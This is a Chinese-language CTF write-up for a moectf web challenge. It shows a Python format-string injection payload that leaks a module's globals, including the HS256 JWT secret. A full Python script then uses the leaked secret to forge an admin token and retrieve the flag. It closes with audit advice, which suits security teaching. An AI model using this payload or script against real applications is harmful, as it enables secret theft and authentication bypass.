# 地狱通讯-改

## 题目简述

站点使用 HS256 JWT 保存用户名，只有令牌中的 `name` 等于 `admin` 时才返回 flag。注册入口又明确拒绝包含 `admin` 的用户名，因此不能直接让服务端签发管理员令牌。

真正的突破口位于 `/hello`：用户可控内容被拼进 Python 格式化字符串，能够沿对象属性泄露 JWT 密钥。得到密钥后，再正常签发管理员令牌即可。

## 解题过程

访问 `/?name=guest` 后，服务端会把普通用户名写入 JWT，并设置 `token` Cookie：

```python
payload = {"name": name}
token = jwt.encode(
    payload,
    secret,
    algorithm="HS256",
    headers=headers,
)
```

`/hello` 解码令牌后，对非管理员用户执行以下逻辑：

```python
user = User(name)
flag = request.args.get("flag") or ""
message = "Hello {0}, your flag is" + flag
return message.format(user)
```

这里的 `flag` 参数不是普通输出内容，而是先被拼入 `message`，随后整体交给 `str.format`。因此可以令它等于：

```text
{0.__class__.__init__.__globals__}
```

格式化参数 `0` 是 `User` 实例。属性链依次取得其类、`__init__` 函数及该函数的全局变量字典。`User` 定义在 `secret.py` 中，所以泄露结果包含同一模块中的 `secret` 和 `headers`：

```python
secret = "u_have_kn0w_what_f0rmat_i5"
headers = {
    "alg": "HS256",
    "typ": "JWT",
}
```

这不是 JWT 的算法混淆漏洞，而是应用先通过格式化字符串暴露了对称签名密钥。拿到密钥后，可以按服务端原本的算法签发 `{"name": "admin"}`：

```python
import re

import jwt
import requests

BASE = "http://127.0.0.1:5000"

session = requests.Session()

# 先让服务端签发一个普通用户令牌。
response = session.get(
    f"{BASE}/",
    params={"name": "guest"},
    timeout=10,
)
response.raise_for_status()

# requests 会自动对花括号等查询参数字符进行 URL 编码。
leak = session.get(
    f"{BASE}/hello",
    params={"flag": "{0.__class__.__init__.__globals__}"},
    timeout=10,
)
leak.raise_for_status()

match = re.search(r"'secret': '([^']+)'", leak.text)
if match is None:
    raise RuntimeError("未在格式化结果中找到 JWT 密钥")
secret = match.group(1)

admin_token = jwt.encode(
    {"name": "admin"},
    secret,
    algorithm="HS256",
    headers={"alg": "HS256", "typ": "JWT"},
)

flag_page = requests.get(
    f"{BASE}/hello",
    cookies={"token": admin_token},
    timeout=10,
)
flag_page.raise_for_status()
print(flag_page.text)
```

管理员模板中的结果为：

```text
moectf{k33p_y0ur_5ecret_k3y_Cautiously!}
```

## 方法总结

本题的完整利用链是“Python 格式化字符串属性遍历泄露模块全局变量，再使用泄露的 HS256 密钥伪造管理员 JWT”。审计这类代码时，不能只检查 `.format()` 的参数是否可控，还要检查格式模板本身是否由用户输入参与构造。JWT 对称密钥一旦进入可被对象遍历触达的模块全局作用域，签名校验就不再提供身份保证。
